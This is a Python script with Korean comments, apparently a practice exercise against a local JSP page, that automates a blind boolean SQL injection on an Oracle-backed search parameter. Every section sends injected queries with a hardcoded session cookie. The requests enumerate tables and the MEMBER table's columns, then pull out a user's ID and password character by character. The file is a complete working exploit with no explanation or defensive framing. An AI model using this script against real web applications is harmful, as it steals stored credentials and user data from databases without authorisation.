import requests
from bs4 import BeautifulSoup as bs

URL = 'http://localhost:8000/chan/view/SQL3.jsp'
sessions = {'JSESSIONID': 'F3D736630BDEF7FD63AF590D8B5FCDFC'}

# 테이블 개수
max_a = 0
for a in range(1,10):
    sqlquery = f"?search=t'AND (SELECT COUNT(table_name) FROM user_tables)> {a} --"
    my_url = URL + sqlquery
    res = requests.get(my_url, cookies=sessions)
    soup = bs(res.content, 'html.parser')
    attr = soup.select_one("td")
    if attr:
        max_a = a + 1

print(f"테이블 개수는 {max_a}개 입니다.")

# 테이블 명
word = ""
for c in range(1,9):
    isfinish = False
    sqlquery = f"?search=t'AND ASCII(SUBSTR((SELECT table_name FROM (SELECT ROWNUM AS RNUM, table_name FROM user_tables) WHERE RNUM=1),{c},1))> 0 --"
    my_url = URL + sqlquery
    res = requests.get(my_url, cookies=sessions)
    soup = bs(res.content, 'html.parser')
    attr = soup.select_one("td")
    if attr == None:
        isfinish = True
    if not isfinish:
        for b in range(65,123):
            sqlquery = f"?search=t'AND ASCII(SUBSTR((SELECT table_name FROM (SELECT ROWNUM AS RNUM, table_name FROM user_tables) WHERE RNUM=1),{c},1))> {b} --"
            my_url = URL + sqlquery
            res = requests.get(my_url, cookies=sessions)
            soup = bs(res.content, 'html.parser')
            attr = soup.select_one("td")
            if attr == None:
                word += chr(b)
                break    
print(word)

# 컬럼 개수
max_d = 0
for d in range(1,10):
    sqlquery = f"?search=t'AND (SELECT COUNT(column_name) FROM all_tab_columns WHERE table_name='MEMBER')> {d} --"
    my_url = URL + sqlquery
    res = requests.get(my_url, cookies=sessions)
    soup = bs(res.content, 'html.parser')
    attr = soup.select_one("td")
    if attr:
        max_d = d + 1

print(f"컬럼 개수는 {max_d}개 입니다.")

# 컬럼 명
word1 = ""
for e in range(1,9):
    isfinish = False
    sqlquery = f"?search=t'AND ASCII(SUBSTR((SELECT column_name FROM (SELECT ROWNUM AS RNUM, column_name FROM all_tab_columns WHERE table_name='MEMBER') WHERE RNUM=1),{e},1))> 0 --"
    my_url = URL + sqlquery
    res = requests.get(my_url, cookies=sessions)
    soup = bs(res.content, 'html.parser')
    attr = soup.select_one("td")
    if attr == None:
        isfinish = True
    if not isfinish:
        for f in range(65,123):
            sqlquery = f"?search=t'AND ASCII(SUBSTR((SELECT column_name FROM (SELECT ROWNUM AS RNUM, column_name FROM all_tab_columns WHERE table_name='MEMBER') WHERE RNUM=1),{e},1))> {f} --"
            my_url = URL + sqlquery
            res = requests.get(my_url, cookies=sessions)
            soup = bs(res.content, 'html.parser')
            attr = soup.select_one("td")
            if attr == None:
                word1 += chr(f)
                break    
print(word1)

word2 = ""
for g in range(1,9):
    isfinish = False
    sqlquery = f"?search=t'AND ASCII(SUBSTR((SELECT column_name FROM (SELECT ROWNUM AS RNUM, column_name FROM all_tab_columns WHERE table_name='MEMBER') WHERE RNUM=2),{g},1))> 0 --"
    my_url = URL + sqlquery
    res = requests.get(my_url, cookies=sessions)
    soup = bs(res.content, 'html.parser')
    attr = soup.select_one("td")
    if attr == None:
        isfinish = True
    if not isfinish:
        for h in range(65,123):
            sqlquery = f"?search=t'AND ASCII(SUBSTR((SELECT column_name FROM (SELECT ROWNUM AS RNUM, column_name FROM all_tab_columns WHERE table_name='MEMBER') WHERE RNUM=2),{g},1))> {h} --"
            my_url = URL + sqlquery
            res = requests.get(my_url, cookies=sessions)
            soup = bs(res.content, 'html.parser')
            attr = soup.select_one("td")
            if attr == None:
                word2 += chr(h)
                break    
print(word2)

# 데이터 추출(아이디)
word3 = ""
for i in range(1,9):
    isfinish = False
    sqlquery = f"?search=t'AND ASCII(SUBSTR((SELECT M_ID FROM (SELECT M_ID, ROWNUM AS RNUM FROM MEMBER) WHERE RNUM=1),{i},1))> 0 --"
    my_url = URL + sqlquery
    res = requests.get(my_url, cookies=sessions)
    soup = bs(res.content, 'html.parser')
    attr = soup.select_one("td")
    if attr == None:
        isfinish = True
    if not isfinish:
        for j in range(48,123):
            sqlquery = f"?search=t'AND ASCII(SUBSTR((SELECT M_ID FROM (SELECT M_ID, ROWNUM AS RNUM FROM MEMBER) WHERE RNUM=1),{i},1))> {j} --"
            my_url = URL + sqlquery
            res = requests.get(my_url, cookies=sessions)
            soup = bs(res.content, 'html.parser')
            attr = soup.select_one("td")
            if attr == None:
                word3 += chr(j)
                break   
    else:
        break
     
print(word3)


# 데이터 추출(비밀번호)
word4 = ""
for k in range(1,50):
    isfinish = False
    sqlquery = f"?search=t'AND ASCII(SUBSTR((SELECT M_PASS FROM (SELECT M_PASS, ROWNUM AS RNUM FROM MEMBER) WHERE RNUM=1),{k},1))> 0 --"
    my_url = URL + sqlquery
    res = requests.get(my_url, cookies=sessions)
    soup = bs(res.content, 'html.parser')
    attr = soup.select_one("td")
    if attr == None:
        isfinish = True
    if not isfinish:
        for l in range(48,123):
            sqlquery = f"?search=t'AND ASCII(SUBSTR((SELECT M_PASS FROM (SELECT M_PASS, ROWNUM AS RNUM FROM MEMBER) WHERE RNUM=1),{k},1))> {l} --"
            my_url = URL + sqlquery
            res = requests.get(my_url, cookies=sessions)
            soup = bs(res.content, 'html.parser')
            attr = soup.select_one("td")
            if attr == None:
                word4 += chr(l)
                break   
    else:
        break
     
print(word4)